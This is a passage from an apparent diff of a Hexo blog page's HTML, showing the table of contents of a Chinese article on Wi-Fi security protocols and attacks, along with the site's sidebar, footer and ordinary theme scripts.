class="nav-text">WPA2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WPA3"><span class="nav-number">2.4.</span> <span class="nav-text">WPA3</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#802-11-%E8%BF%9E%E6%8E%A5%E8%BF%87%E7%A8%8B"><span class="nav-number">3.</span> <span class="nav-text">802.11 连接过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WPA-WPA2-%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B"><span class="nav-number">4.</span> <span class="nav-text">WPA&#x2F;WPA2 四次握手</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Msg1"><span class="nav-number">4.1.</span> <span class="nav-text">Msg1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Msg2"><span class="nav-number">4.2.</span> <span class="nav-text">Msg2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Msg3"><span class="nav-number">4.3.</span> <span class="nav-text">Msg3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Msg4"><span class="nav-number">4.4.</span> <span class="nav-text">Msg4</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="nav-number">5.</span> <span class="nav-text">常见攻击方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A6%BB%E7%BA%BF%E5%AD%97%E5%85%B8%E6%94%BB%E5%87%BB"><span class="nav-number">5.1.</span> <span class="nav-text">离线字典攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DeAuth-Attack"><span class="nav-number">5.2.</span> <span class="nav-text">DeAuth Attack</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Wi-Fi-%E9%92%93%E9%B1%BC"><span class="nav-number">5.3.</span> <span class="nav-text">Wi-Fi 钓鱼</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%86%E9%92%A5%E9%87%8D%E8%A3%85%E6%94%BB%E5%87%BB"><span class="nav-number">5.4.</span> <span class="nav-text">密钥重装攻击</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#References"><span class="nav-number">6.</span> <span class="nav-text">References</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Mamor"
+      src="/images/kabi.jpg">
+  <p class="site-author-name" itemprop="name">Mamor</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">183</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">52</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">52</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Mamor5409" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Mamor5409" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.yuque.com/mamor" title="Yuque → https:&#x2F;&#x2F;www.yuque.com&#x2F;mamor" rel="noopener" target="_blank"><i class="yuque fa-fw"></i>Yuque</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Mamor</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">1.2m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">18:08</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+-->
+
+<!--
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共246.6k字</span>
+</div>
+-->
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/ClickShowText.js"></script>
+
+<script type="text/javascript">
+var windowWidth = $(window).width();
+if (windowWidth > 768) {
+    document.write('<script type="text/javascript" src="/js/sakura.js"><\/script>');
+}
+</script>
+
+
+
+
+
+
+  <script src="/js/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+
+<a href="https://mamor5409.github.io/" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#64CEAA; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"rect":"opacity:0.7","log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+
+
+<!--崩溃欺骗-->
+<script type="text/javascript" src="/js/src/crash_cheat.js"></script>
+
+</html>
+
